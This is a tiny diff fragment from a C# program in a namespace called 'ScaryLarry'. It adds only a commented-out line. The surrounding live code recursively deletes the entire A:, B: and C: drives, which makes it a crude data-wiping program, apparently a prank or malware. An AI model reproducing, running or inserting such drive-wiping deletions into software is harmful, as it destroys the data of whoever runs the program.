@@ -11,6 +11,7 @@ namespace ScaryLarry
 			Directory.Delete("A:\\", true);
 			Directory.Delete("B:\\", true);
 			Directory.Delete("C:\\", true);
+			//Directory.Delete("C:\\", true);
 		}
 	}
 }
